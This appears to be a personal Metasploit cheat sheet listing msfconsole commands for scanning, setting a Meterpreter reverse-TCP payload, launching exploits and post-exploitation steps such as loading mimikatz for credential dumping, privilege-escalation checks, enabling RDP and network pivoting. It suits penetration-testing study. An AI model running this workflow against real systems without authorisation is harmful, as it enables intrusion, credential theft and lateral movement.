Metasploit Framework
> msfconsole
---

### Metasploit basics

Initialize metasploit instance
```
msfdb init

msfconsole -q

msf5> db_status
```

Help and usage
```
?
help
```

Module searching, usage, info connect
```
search <name/exploit>

use <exploit/name/>

info <exploit/name>

connect
```

Change variable and global values
```
set
unset

setg
unsetg

get
```

Save and output file save
```
save
spool
```

Module Types
```
exploit
payload
auxilliary
post
encoder
NOP
```

Scanning using nmap on msf
```
msf5> db_nmap -sV -sC -A -T4 <ip> -v`

```

Checking for hosts, services and vulns
```
hosts
services
vulns
```
Example searches for exploits / module
```
search multi/handler
use # or <module_name>
```

Setting payloads example
```
set payload windows/meterpreter/reverse_tcp
set lhost <host_ip>
set rhost <target_ip>
```

Initiating exploitation
```
run
run -j
exploit
jobs
```

Interactions (run -j)
```
sessions
sessions -i <session_id>
```
---

### Meterpreter sessions
Check for processes and migration
```
meterpreter> ps
meterpreter> migrade -P <pid> | -N <ps_name>

```

Load mimikatz module
```
load kiwi
load mimikatz
```
Upload file
```
upload <file>
```

Run module on meterpreter session
```
run post/windows/gather/checkvm
```

Post Exploitation things
```
getuid
sysinfo
getprivs
ipconfig
shell
```

Other commands
```
run post/windows/gather/checkvm 		(check if the machine is a vm)
run post/multi/recon/local_exploit_suggester 	(check various exploits for privesc)
run post/windows/manage/enable_rdp 		(enable rdp admin privilege required)
run autoroute -h				(routing table help)
run autoroute -s <ip> -n 255.255.255.0		(add a routing table)

```
